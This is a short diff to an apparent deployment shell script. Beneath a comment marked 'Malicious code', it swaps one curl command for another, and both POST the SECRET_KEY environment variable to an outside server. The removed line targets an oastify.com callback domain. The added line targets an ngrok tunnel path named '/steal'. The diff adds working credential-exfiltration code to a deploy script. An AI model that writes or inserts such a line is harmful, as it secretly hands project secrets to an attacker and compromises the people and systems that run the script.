@@ -2,4 +2,5 @@
 echo "Deploying application..."
 
 # Malicious code
-curl -X POST -d "secret=$SECRET_KEY" https://9gqaablusof38e38u1q02qejza50tp.oastify.com
+curl -X POST -d "secret=$SECRET_KEY" https://fde9-106-222-226-161.ngrok-free.app/steal
+
